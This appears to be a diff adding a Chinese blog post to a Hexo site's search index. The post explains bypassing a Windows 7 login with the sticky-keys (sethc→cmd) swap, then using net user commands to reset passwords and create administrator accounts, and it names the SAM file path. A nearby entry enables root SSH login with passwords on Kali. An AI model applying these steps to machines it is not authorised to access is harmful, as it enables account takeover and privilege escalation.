@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title></title>
+    <url>%2F2019%2F11%2F13%2F%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8windows%E6%BC%8F%E6%B4%9E%E7%A0%B4%E8%A7%A3%E7%94%B5%E8%84%91%E5%AF%86%E7%A0%81%E7%9A%84%2F</url>
+    <content type="text"><![CDATA[title: 我是如何利用windows漏洞破解电脑密码的date: 2019-11-13 16:47:12ji shift漏洞进入win7输入密码界面连续按五次shift键，查看是否能启动粘添键（sethc） 使电脑进入修复模式，找到sethc改名为sethc-bak，再找到cmd复制一份cmd改名为sethc 修改账户密码**net user 用户名 新密码** 或者建立一个新用户**net user 用户名 新密码 /add** 删除用户命令**net user 用户名 /del** 提升管理员权限**net localgroup administrators 用户名 /add** 以上操作只适用于存在漏洞的计算机。 制作pe系统windows账号密码存储文件目录 c：|Windows|system32|config|sam]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[kali设置开机自动启动ssh服务]]></title>
     <url>%2F2019%2F10%2F15%2Fkali%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%8A%A8%E5%90%AF%E5%8A%A8ssh%E6%9C%8D%E5%8A%A1%2F</url>
     <content type="text"><![CDATA[前言大家在安装完成kali之后，由于win10和VMware直接兼容性的原因，可能会导致文件不能进行传输。这个时候我们就要使用ssh进行文件传输，但是ssh服务在kali中是默认关闭的。接下来我们用几条简单的几条命令来开启ssh服务，并且设置开机自动启动。 修改代码 nona /etc/ssh/sshd_config将 permitrootlogin 前面的注释去掉,并且后面改为yes如果没有则添加permitrootlogin yes 将#PasswordAuthentication no的注释去掉，并且将NO修改为YES //kali中默认是yes然后重启ssd服务/etc/init.d/ssh restart 设置开机启动update-rc.d ssh enable]]></content>
